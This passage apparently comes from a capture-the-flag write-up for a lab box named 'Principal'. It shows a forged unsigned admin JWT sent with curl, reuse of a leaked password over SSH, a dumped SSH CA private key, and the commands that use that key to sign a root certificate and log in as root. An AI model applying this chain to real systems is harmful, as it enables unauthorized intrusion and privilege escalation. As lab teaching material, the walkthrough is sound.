+❯ curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIiwiaXNzIjoicHJpbmNpcGFsLXBsYXRmb3JtIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjI1MTYyMzkwMjJ9." http://10.129.40.176:8080/api/settings | jq
+{
+  "infrastructure": {
+    "sshCaPath": "/opt/principal/ssh/",
+    "sshCertAuth": "enabled",
+    "database": "H2 (embedded)",
+    "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config."
+  },
+  "integrations": [
+    {
+      "name": "GitLab CI/CD",
+      "lastSync": "2025-12-28T12:00:00Z",
+      "status": "connected"
+    },
+    {
+      "name": "Vault",
+      "lastSync": "2025-12-28T14:00:00Z",
+      "status": "connected"
+    },
+    {
+      "name": "Prometheus",
+      "lastSync": "2025-12-28T14:30:00Z",
+      "status": "connected"
+    }
+  ],
+  "security": {
+    "authFramework": "pac4j-jwt",
+    "authFrameworkVersion": "6.0.3",
+    "jwtAlgorithm": "RS256",
+    "jweAlgorithm": "RSA-OAEP-256",
+    "jweEncryption": "A128GCM",
+    "encryptionKey": "D3pl0y_$$H_Now42!",
+    "tokenExpiry": "3600s",
+    "sessionManagement": "stateless"
+  },
+  "system": {
+    "version": "1.2.0",
+    "environment": "production",
+    "serverType": "Jetty 12.x (Embedded)",
+    "javaVersion": "21.0.10",
+    "applicationName": "Principal Internal Platform"
+  }
+}
+```
+
+## The first foothold
+
+Now, we know that we have a SSH port and we have a plaintext password: `"encryptionKey": "D3pl0y_$$H_Now42!"` 
+
+I tried with the enumerated users in `/api/users` just in case and... IT WORKED!
+
+To avoid noise, I'll just paste the username that works with the password.
+```
+❯ ssh svc-deploy@10.129.40.176
+svc-deploy@10.129.40.176's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+svc-deploy@principal:~$ 
+```
+
+Now we can retrieve the user flag:
+```
+svc-deploy@principal:~$ ls
+user.txt
+svc-deploy@principal:~$ cat user.txt
+```
+
+## Privilege Escalation & root flag
+
+We're into the machine! now let's enumerate `svc-deploy`! 
+```
+svc-deploy@principal:~$ sudo -l
+[sudo] password for svc-deploy: 
+Sorry, user svc-deploy may not run sudo on principal.
+svc-deploy@principal:~$ crontab -l
+no crontab for svc-deploy
+svc-deploy@principal:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+#
+svc-deploy@principal:~$ id
+uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
+```
+
+Ok! we have some interesting info, let's dig deeper.
+```
+svc-deploy@principal:~$ find / -group deployers 2>/dev/null
+/etc/ssh/sshd_config.d/60-principal.conf
+/opt/principal/ssh
+/opt/principal/ssh/README.txt
+/opt/principal/ssh/ca
+svc-deploy@principal:~$ 
+```
+
+Perfect, now let's check that folders.
+
+#### /etc/ssh/sshd_config.d/60-principal.conf
+```
+svc-deploy@principal:~$ cat /opt/principal/ssh/README.txt 
+CA keypair for SSH certificate automation.
+
+This CA is trusted by sshd for certificate-based authentication.
+Use deploy.sh to issue short-lived certificates for service accounts.
+
+Key details:
+  Algorithm: RSA 4096-bit
+  Created: 2025-11-15
+  Purpose: Automated deployment authentication
+svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf     
+# Principal machine SSH configuration
+PubkeyAuthentication yes
+PasswordAuthentication yes
+PermitRootLogin prohibit-password
+TrustedUserCAKeys /opt/principal/ssh/ca.pub
+```
+#### /opt/principal/ssh/README.txt
+```
+svc-deploy@principal:~$ cat /opt/principal/ssh/README.txt 
+CA keypair for SSH certificate automation.
+
+This CA is trusted by sshd for certificate-based authentication.
+Use deploy.sh to issue short-lived certificates for service accounts.
+
+Key details:
+  Algorithm: RSA 4096-bit
+  Created: 2025-11-15
+  Purpose: Automated deployment authentication
+```
+
+#### /opt/principal/ssh/ca
+```
+svc-deploy@principal:~$ cat /opt/principal/ssh/ca
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Well, that's it—we're practically root now, since we have the SSH private key.
+Let's start by generating a pair of RSA keys:
+```
+svc-deploy@principal:~$ ssh-keygen -t rsa -b 4096 -f /tmp/id_root -N ""
+Generating public/private rsa key pair.
+Your identification has been saved in /tmp/id_root
+Your public key has been saved in /tmp/id_root.pub
+The key fingerprint is:
+SHA256:0GcFsLmO0zBaa7gVW6uwlRvv1aVUJLq9kLaRbp4KJ2Y svc-deploy@principal
+The key's randomart image is:
++---[RSA 4096]----+
+|        ....o .  |
+|       . o o o   |
+|      . + +   .  |
+|       . + = .   |
+|      = S B o .  |
+|     + % + * +   |
+|    + E = = +    |
+|     X X + .     |
+|    o o.+.o      |
++----[SHA256]-----+
+svc-deploy@principal:~$ 
+```
+
+Now let's create the file `/tmp/cakey` with the SSH Private key in it.
+```
+svc-deploy@principal:~$ vim /tmp/cakey
+```
+
+Now we paste the key into the file, save and quit.
+
+After this, we have to give permissions and sign the certificate.
+```
+svc-deploy@principal:~$ chmod 600 /tmp/cakey
+svc-deploy@principal:~$ ssh-keygen -s /tmp/cakey -I "pwn_session" -n root -V +1h /tmp/id_root.pub
+Signed user key /tmp/id_root-cert.pub: id "pwn_session" serial 0 for root valid from 2026-04-19T11:01:00 to 2026-04-19T12:02:58
+```
+
+Now that all this is done, all that's left is to log in as root.
+```
+svc-deploy@principal:~$ ssh -i /tmp/id_root root@localhost
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+root@principal:~# 
+```
+
+Now we just have to retrieve the root flag!
+```
+root@principal:~# ls
+root.txt
+root@principal:~# cat root.txt
+```
+
+That's it for today! I hope this write-up was helpful and that you learned a bit more about SSH and JWK authentication.
+</textarea>
+</body>
+</html>
